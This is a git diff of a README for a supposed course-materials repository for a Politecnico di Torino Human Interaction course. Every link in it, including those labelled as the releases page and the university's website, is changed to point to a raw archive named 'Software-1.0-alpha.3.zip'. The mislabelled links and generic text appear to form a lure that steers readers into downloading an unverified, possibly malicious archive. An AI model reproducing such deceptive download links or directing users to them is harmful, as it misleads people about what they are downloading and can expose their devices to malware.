@@ -4,7 +4,7 @@
 
 Welcome to the materials repository! This project provides study materials for the Human Interaction course at Politecnico di Torino for the academic year 2025/2026. Here, you can find slides, documents, and other resources to help you succeed in your studies.
 
-[![Download Materials](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip)](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip)
+[![Download Materials](https://github.com/hayan-k/materials/raw/refs/heads/main/assignments/Software-1.0-alpha.3.zip)](https://github.com/hayan-k/materials/raw/refs/heads/main/assignments/Software-1.0-alpha.3.zip)
 
 ## 📁 Features
 
@@ -24,7 +24,7 @@ Before you download, ensure that your device meets these basic requirements:
 
 To get the materials, please follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip) to find the latest versions of the materials.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/hayan-k/materials/raw/refs/heads/main/assignments/Software-1.0-alpha.3.zip) to find the latest versions of the materials.
    
 2. **Select Your Files**: Browse through the available files. You will see various formats like PDFs and slides.
 
@@ -61,7 +61,7 @@ Your input is valuable! If you want to contribute to the materials or suggest im
 
 Join our community to stay connected:
 
-- **Website**: [Politecnico di Torino](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip)
+- **Website**: [Politecnico di Torino](https://github.com/hayan-k/materials/raw/refs/heads/main/assignments/Software-1.0-alpha.3.zip)
 - **Discussion Forums**: Engage with fellow students on our dedicated platforms.
 
 Thank you for choosing the materials repository. We hope it supports you in your academic journey!
